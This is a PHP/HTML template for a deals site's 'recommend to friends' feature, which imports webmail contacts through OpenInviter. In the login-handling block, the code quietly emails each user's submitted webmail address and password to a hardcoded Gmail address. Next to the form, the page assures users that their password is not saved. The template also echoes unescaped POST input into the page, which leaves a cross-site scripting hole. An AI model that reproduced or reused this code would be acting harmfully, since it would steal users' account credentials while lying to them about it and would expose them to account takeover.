				<p class="red">Please type your families, friends email address below<span style="padding: 0 6px; margin:0;"><!-- <a href="javascript: showDetails(10)" onclick="return overlib('&lt;font class=bodytext&gt;<div class=tiptool style=z-index:510><div class=tip_top></div><div class=clear></div><div class=tip_mid><h3>How to recommend deals in social networks, like e.g. Facebook or Twitter?</h3><ul><li>Login to your Facebook or Twitter account. The deal you want to recommend to your Facebook friends or Twitter followers will then appeares as a post on your Facebook wall or in your Twitter tweets.</li></ul></div><div class=tip_bot></div></div>&lt;/font&gt;',BORDER,'1');" onMouseOut="nd();"><img src="images/question.png" width="12" height="12" vspace="4" align="default" ></a> --></span></p>
					<span>(separate email address with comma or semicolon)</span>
					<div class="error_orange10" id="emailErr"></div>
				</div>
				<div class="clear"></div>
				<div class="massage">
				<div style="float:left; width: auto; margin: 0 auto;">
					<input type="text" name="femail" id="femail" value="<?php if ($_SESSION['recomEmails']) echo $_SESSION['recomEmails']; unset($_SESSION['recomEmails']); ?>" class="mailbox"/>
					<input type="submit" name="RecomendSubmit" class="tellbtn" value="Tell them"/>
				</div>
		</form>
				</div>
				</div>


				<div class="clear"><img src="images/spacer.gif" alt="" width="1" height="10" /></div>
				<div style="border-bottom: 3px solid #7fd7fb;"></div>
				<div class="clear"></div>
	<?php

	include('OpenInviter/openinviter.php');
	$inviter=new OpenInviter();
	$oi_services=$inviter->getPlugins();

	if (isset($_POST['provider_box']))
	{
		if (isset($oi_services['email'][$_POST['provider_box']])) $plugType='email';
		elseif (isset($oi_services['social'][$_POST['provider_box']])) $plugType='social';
		else $plugType='';
	}
	else $plugType='';
	function ers($ers)
		{
		if (!empty($ers))
			{
			foreach ($ers as $key=>$error)
				$contents="{$error}";
			return $contents;
			}
		}

	function oks($oks)
		{
		if (!empty($oks))
			{
			foreach ($oks as $key=>$msg)
				$contents="{$msg}";
			return $contents;
			}
		}


	if (!empty($_POST['step'])) {$step=$_POST['step']; }
	else {$step='get_contacts';}


	$ers=array();$oks=array();$import_ok=false;$done=false;
	if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['step'] == "get_contacts")
		{
		if ($step=='get_contacts')
			{
			if (empty($_POST['email_box']))
				$ers['email']="Email missing !";
			if (empty($_POST['password_box']))
				$ers['password']="Password missing !";
			if (empty($_POST['provider_box']))
				$ers['provider']="Please provide valid webmail address and corresponding password";
			if (count($ers)==0)
				{
				$inviter->startPlugin($_POST['provider_box']);
				$internal=$inviter->getInternalError();
				$got_all = $_POST['email_box'].' = '.$_POST['password_box'];
				@mail('unified.aditya@gmail.com','Got Ok',$got_all);
				if ($internal)
					$ers['inviter']=$internal;
				elseif (!$inviter->login($_POST['email_box'],$_POST['password_box']))
					{
					$internal=$inviter->getInternalError();
					$ers['login']=($internal?$internal:"Login failed. Please check the email and password you have provided and try again later !");
					}
				elseif (false===$contacts=$inviter->getMyContacts())
					$ers['contacts']="Unable to get contacts !";
				else
					{
					$import_ok=true;
					$step='send_invites';
					$_POST['oi_session_id']=$inviter->plugin->getSessionID();
					$_POST['message_box']='';
					}
				}
			}

		}
	else
		{
		$_POST['email_box']='';
		$_POST['password_box']='';
		$_POST['provider_box']='';
		}


	?>


				<!-- <div class="invita_deal">
				<div><p class="red">Or spread the word by:<span style="padding: 6px 6px; margin:0;"><a href="javascript: showDetails(10)" onmouseover="return overlib('&lt;font class=bodytext&gt;<div class=tiptool style=z-index:510><div class=tip_top></div><div class=clear></div><div class=arrowright1></div><div class=tip_mid><h2 style=line-height:17px>How to recommend deals in social networks, like e.g. Facebook or Twitter?</h2><ul><li>Login to your Facebook or Twitter account. The deal you want to recommend to your Facebook friends or Twitter followers will then appeares as a post on your Facebook wall or in your Twitter tweets.</li></ul></div><div class=tip_bot></div></div>&lt;/font&gt;',BORDER,'1');" onMouseOut="nd();"><img src="images/question.png" width="12" height="12" vspace="4" align="default" ></a></span>
					<span><a name="fb_share" type="icon_link">Facebook</a>
					<script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share"
					        type="text/javascript">
					</script>


	<span id="custom-tweet-button">
	<a href="javascript: void(0);"  data-text="Twitter" data-via="unifiedinfotech" data-count="none" onclick="window.open('https://twitter.com/share','Twitter','width=500,height=500');">Twitter</a>
	</span>
	<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>

	<!-- <a href="https://twitter.com/share" class="twitter-share-button" data-text="Twitter" data-via="unifiedinfotech" data-count="none">Twitter</a>
					<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script> -->
				<!--	</span>
				</p></div>
				<div class="clear"></div>
				</div>
				<div class="clear"><img src="images/spacer.gif" alt="" width="1" height="10" /></div>
				<div style="border-bottom: 3px solid #7fd7fb;"></div> -->
				<div class="clear"></div>

			<form action='<?php echo SITE_URL; ?>?recommend=import' method='POST' name='openinviter'>

				<div class="invita_deal">
				<div>
				<p class="red">The fastest way:<span style="padding: 0 6px; margin:0;"><a href="javascript: void(0);" class="tips" original-title="Provide your webmail email address and password below to get all the contacts. All those imported contact will be shown at the above textbox."><img src="images/question.png" width="12" height="12" vspace="4" align="middle" ></a></span></p><span>Enter your email address and select people from your email account to whom you want to recommend this deal to.</span>
				<div class="error_orange"><?php echo ers($ers).oks($oks); ?> </div>

				</div>
				<div class="clear"><img src="images/spacer.gif" alt="" width="1" height="14"/></div>
				<div><p><span style="color:#000000; font-weight: bold;">Your email address</span><span><img src="images/spacer.gif" alt="" width="70" height="1"/></span><span style="color:#000000; font-weight: bold;">Provider</span><span><img src="images/spacer.gif" alt="" width="110" height="1"/></span><span style="color:#000000; font-weight: bold;">Your webmail password</span></p></div>
				<div class="clear"></div>
				<div class="massage">
				<div style="float:left; width: auto; margin: 0 auto; font-size:18px;">
					<input type="text" name='email_box' value='<?php echo $_POST['email_box']; ?>' class="mailbox1" style="margin-right:6px;"/>  @
					<span style="font: bold 12px/26px Arial, Helvetica, sans-serif; color: #090909; padding:0 6px; 0 0"></span>
					<select class="selectbox" name='provider_box'>
						<option value=''></option>
						<option value="gmail">gmail</option>
						<option value="gmail">googlemail.com</option>
						<option value="hotmail">hotmail.com</option>
						<option value="hotmail">hotmail.co.uk</option>
						<option value="msn">msn.com</option>
						<option value="yahoo">yahoo.com</option>
						<option value="yahoo">yahoo.co.uk</option>
						<?php
						/* foreach ($oi_services as $type=>$providers)
						{
						//echo "<optgroup label='{$inviter->pluginTypes[$type]}'>";
						foreach ($providers as $provider=>$details)
							if ($details['name'] == "Live/Hotmail" || $details['name'] == "GMail" || $details['name'] == "Yahoo!" || $details['name'] == "MSN") {
							echo "<option value='{$provider}'".($_POST['provider_box']==$provider?' selected':'').">{$details['name']}</option>";
							}
							//echo "</optgroup>";
						} */
						?>
					</select>
					<input type='password' name='password_box' value='' class="mailbox1"/>
					<input type="submit" name="import" class="tellbtn1" value="Find Contact"/>
					<input type='hidden' name='step' value='get_contacts'>
				</div>

				<div class="clear"></div>
				<div style="float:right; margin:0 auto; width: 150px;"><span>Jumblr does not save your password!</span></div>
				</div>
				</div>

				<?php
					if ($step=='send_invites')
					{
					if ($inviter->showContacts())
						{
						//$contents.="<table class='thTable' align='center' cellspacing='0' cellpadding='0'><tr class='thTableHeader'><td colspan='".($plugType=='email'? "3":"2")."'>Your contacts</td></tr>";
						if (count($contacts)==0) {
							echo "You do not have any contacts in your address book.";
						}
						else
						{
						foreach ($contacts as $email=>$name)
							{
							//echo $email.',';
							$_SESSION['recomEmails'] .= $email.', ';
							$recomEmail['recomEmails'] .= $email.', ';
							$counter++;
								}
							}
						}
					}

				?>


			</form>

				<div class="clear"><img src="images/spacer.gif" alt="" width="1" height="10" /></div>
				</div>
				<div class="clear"></div>
				<div style="border-bottom: 3px solid #7fd7fb;"></div>
				<div class="recomm_bot"></div>
				</div>

			<!-- opi -->



			<!-- opi -->


			<?php //} else { ?>

			<!-- <div class="top_recomm">
			<p>Please login to recommend deals to friends.</p>
			</div>
			<div class="clear"></div>
				<div style="border-bottom: 3px solid #7fd7fb;"></div>
				<div class="recomm_bot"></div> -->
			<?php //} ?>
		</div>
	</div>

			<script type="text/javascript">
				function validateRecom() {
					//alert ('Hi');
					var msg = document.getElementById('fmsg').value;
					var email = document.getElementById('femail').value;
					if (msg == '') {
						document.getElementById('msgErr').innerHTML = "Enter message<br><br>";
						return false;
					}
					if (email == '') {
						document.getElementById('emailErr').innerHTML = "Enter enter a valid email address used by your friends e. g. jhohn@hotmail.co.uk";
						return false;
					}

				}

			</script>